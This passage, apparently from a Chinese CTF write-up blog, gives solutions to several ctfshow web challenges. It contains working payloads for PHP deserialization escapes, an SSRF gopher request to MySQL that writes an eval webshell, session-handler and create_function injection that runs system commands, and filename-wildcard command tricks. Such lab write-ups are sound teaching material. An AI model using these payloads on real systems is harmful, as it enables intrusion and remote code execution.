punctuation\">}</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">dbCtrl</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 密码，用来绕过第三个判断</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">dbCtrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token variable\">$in</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token variable\">$in</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">CtrlCase</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 类内的 Info 对象的 CtrlCase 为一个 dbCrtl 对象</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token variable\">$user</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">nickname</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$in</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//nickname 为一个 Info 类对象</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$updateHelper</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">UpdateHelper</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token variable\">$updateHelper</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">sql</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//UpdateHelper 对象的 sql 为一个 User 对象</span></pre></td></tr></tbody></table></figure><p>由于 <code>Info</code>  类序列化结果为 <code>O:4:\"Info\":3:{s:3:\"age\";s:2:\"xx\";s:8:\"nickname\";s:3:\"xxx\"</code>  的格式，这里为了让后面添加成功，不妨先用 <code>\"</code>  提前闭合 nickname 的值，之后添加 <code>;s:8:\\\"CtrlCase\\\";\" . serialize($updateHelper). \"}\";</code>  (加  <code>} </code> 是为了闭合第一个 <code>{ </code> ，使反序列化成功， <code>echo</code>  后，加上添加的 <code>\"</code>  、 <code>}</code>  总共为 302 个字符，所有有一个 into 换一个 hacker 多两个字符算，总共有 151 个 <code>into</code> ，故 payload 为</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>age=18&amp;nickname=intointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointo\";s:8:\"CtrlCase\";O:12:\"UpdateHelper\":1:{s:3:\"sql\";O:4:\"User\":3:{s:2:\"id\";N;s:3:\"age\";s:69:\"SELECT 1,\"c4ca4238a0b923820dcc509a6f75849b\"from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";N;s:8:\"nickname\";N;s:8:\"CtrlCase\";O:6:\"dbCtrl\":2:{s:4:\"name\";s:5:\"admin\";s:8:\"password\";s:1:\"1\";}}}}}</pre></td></tr></tbody></table></figure><p>脚本为</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> * @Author       : zhong</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> * @since        : 2022-07-21 16:12:08</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> * @LastAuthor   : zhong</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> * @lastTime     : 2022-07-21 16:28:22</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> */</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT 1,\\\"c4ca4238a0b923820dcc509a6f75849b\\\"from user where username=?\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Info</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$CtrlCase</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">UpdateHelper</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">dbCtrl</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">dbCtrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token variable\">$uh</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">UpdateHelper</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token variable\">$info</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token variable\">$uh</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">sql</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token variable\">$user</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">nickname</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$info</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token variable\">$info</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">CtrlCase</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token comment\">// 此为 nickname 的值</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"into\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">151</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"\\\";s:8:\\\"CtrlCase\\\";\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uh</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"}\"</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h2 id=\"web15-fishman\"><a class=\"anchor\" href=\"#web15-fishman\">#</a> web15 Fishman</h2>\n<p>不会</p>\n<h2 id=\"红包题第九弹\"><a class=\"anchor\" href=\"#红包题第九弹\">#</a> 红包题第九弹</h2>\n<p>SSRF Gopher 协议 攻击 mysql 写入</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token string\">'&lt;?php eval($_POST[1]); ?&gt;'</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">OUTFILE</span> <span class=\"token string\">'/var/www/html/1.php'</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>数据库名臣为 root<br>\n 是由 Gopher 工具<br>\n生成</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%27%01%00%00%00%01</pre></td></tr></tbody></table></figure><p>之后进行 url 编码<br>\n最后 payload 为</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>u=Username&amp;returl=gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2527%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2531%255d%2529%253b%253f%253e%2527%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2527%2501%2500%2500%2500%2501</pre></td></tr></tbody></table></figure><p>最后访问 1.php，正常 rce</p>\n<h2 id=\"nl\"><a class=\"anchor\" href=\"#nl\">#</a> nl</h2>\n<p>Linux 中可以将文件名作为函数和参数，通过星号通配执行</p>\n<p>新建一个名称是 nl 的文件作为指令</p>\n<p><code>?1=&gt;nl</code> <br>\n 将右尖括号左侧的内容写入右侧文件，因此相当于新建了一个叫 nl 的空文件</p>\n<p><code>?1=*&gt;z</code></p>\n<p><code>*</code>  代表当前文件夹下的所有文件<br>\n <code>*&gt;z</code>  就是就是把当前文件夹的文件显示在 <code>z</code>  中<br>\n这样就只有文件 z 的内容就是 <code>nl index.php</code></p>\n<p>之后访问该文件，会自动下载该文件，文件内内容有 flag</p>\n<h2 id=\"红包题-耗子尾汁\"><a class=\"anchor\" href=\"#红包题-耗子尾汁\">#</a> 红包题 耗子尾汁</h2>\n<p>在 php 当中默认命名空间是 \\，所有原生函数和类都在这个命名空间中。普通调用一个函数，</p>\n<p>如果直接写函数名 function_name () 调用，调用的时候其实相当于写了一个相对路径；</p>\n<p>而如果写 \\function_name () 这样调用函数，则其实是写了一个绝对路径。如果你在其他 namespace 里调用系统类，就必须写绝对路径这种写法</p>\n<p>解一：<br>\n <code>a=\\system&amp;b[]=ls</code> <br>\n <code>a=\\system&amp;b[]=cat flag.php</code> <br>\n 解二：<br>\n套娃<br>\n <code>a=forward_static_call_array&amp;b[0]=system&amp;b[1][0]=ls</code></p>\n<h2 id=\"一切看起来都那么合情合理\"><a class=\"anchor\" href=\"#一切看起来都那么合情合理\">#</a> 一切看起来都那么合情合理</h2>\n<p>分析完代码，我们的思路就比较明确啦，我们可以利用 <code>index.php</code>  里面的 <code>session_start()</code>  设置，控制 $_SESSION 的值（也就是 limit）写入我们的 payload 到服务器的 <code>/tmp/sess_xxxx</code> ，然后利用 <code>nc.php </code> 里面的 <code>ini_set('session.serialize_handler', 'php')</code>  设置去反序列化服务器上的 <code>/tmp/sess_xxxx</code>  文件，从而执行 <code>inc.php</code>  里面 <code>User</code>  类的 <code>file_put_contents()</code>  函数写入一句话</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> * @Author       : zhong</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> * @since        : 2022-07-21 23:57:24</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> * @LastAuthor   : zhong</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> * @lastTime     : 2022-07-22 00:31:02</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> */</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$status</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"|\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1.php'</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"&lt;?php system('cat fl*');?&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p><code>|O:4:\"User\":3:{s:8:\"username\";s:5:\"1.php\";s:8:\"password\";s:26:\"&lt;?php system('cat fl*');?&gt;\";s:6:\"status\";N;}</code></p>\n<p>修改 <code>index.php</code>  的 <code>session</code>  值， <code>limit</code>  为上述代码得到的 base64 编码内容，之后不断提交并访问 <code>inc/inc.php</code> , 最后访问 <code>log-1.php</code></p>\n<p>得到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>使用<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 16:07:03</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-06 19:21:29</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$flag</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"ctfshow{136f0acc-0af6-4036-bea1-48e6e7ee1258}\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>登陆失败<span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token number\">2022</span><span class=\"token operator\">-</span><span class=\"token number\">07</span><span class=\"token operator\">-</span><span class=\"token number\">22</span> <span class=\"token number\">00</span><span class=\"token punctuation\">:</span><span class=\"token number\">28</span><span class=\"token punctuation\">:</span><span class=\"token number\">30</span></pre></td></tr></tbody></table></figure><h2 id=\"新年好\"><a class=\"anchor\" href=\"#新年好\">#</a> 新年好？</h2>\n<p>payload: <code>/flag?delay=2147483648</code></p>\n<p><code>setTimeout</code>  最多只能推迟执行 <code>2147483647</code>  毫秒（24.8 天），超过这个时间会发生溢出，导致回调函数将在当前任务队列结束后立即执行</p>\n<h2 id=\"红包挑战8\"><a class=\"anchor\" href=\"#红包挑战8\">#</a> 红包挑战 8</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2023-08-08 00:12:34</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2023-08-08 00:26:48</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token function\">extract</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token function\">create_function</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>该题主要用到了 create_function () 的注入漏洞</p>\n<p>对于 create_function ()，其作用为将第一个参数作为变量，第二个参数作为代码执行内容，实现原理是将代码字符串进行拼接，然后在内部使用 eval 函数，故存在与 eval 相同的漏洞</p>\n<p>如 <code>create_function('$id',$str);</code></p>\n<p>那么执行后得到的函数为</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">ft</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>如果 <code>$str = echo $id</code></p>\n<p>那么生成的函数即为输出输入参数 <code>$id</code></p>\n<p>注入的原理即为前面所说的字符串拼接</p>\n<p>如果第一个参数可以控制，那么根据生成的函数结构，可以闭合小括号和花括号</p>\n<p>如 <code>id = ){}phpinfo();//</code></p>\n<p>那么将会得到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">ft</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>如果第二个参数可以控制，那么需要闭合花括号</p>\n<p>如 <code>$str =}phpinfo();//</code></p>\n<p>那么将会得到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">ft</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token punctuation\">}</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>综上，显然以上生成的字符串经过 eval，都会执行 <code>phpinfo()</code> ，故之后只要替换 <code>phpinfo()</code> ，即可 RCE</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>?name=){}system('ls');//</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>index.php</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>?name=){}system('ls /');//</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>bin dev etc flag home lib media mnt opt proc root run sbin srv sys tmp usr var</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>?name=){}system('cat /flag');//</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>ctfshow{cdc80ad7-d48a-4b86-b0fc-21c43b785613}</pre></td></tr></tbody></table></figure><h1 id=\"reverse\"><a class=\"anchor\" href=\"#reverse\">#</a> reverse</h1>\n<h2 id=\"re2\"><a class=\"anchor\" href=\"#re2\">#</a> re2</h2>\n<p>点击 <code>勒索病毒.exe</code> ，发现无论选择哪一个都无用</p>\n<p>用 ida 打开，打开 String Window，可以看到之前在控制台的文字</p>\n<p><img data-src=\"E:%5Cblog%5Csource%5C%E7%B4%A0%E6%9D%90%5Cctfshow%5Creverse%5Cre2_1.jpg\" alt=\"\"></p>\n<p>看到 <code>flag.txt</code> , 点击，查看相关函数，发现不能进入</p>\n<p>依次检查，点击 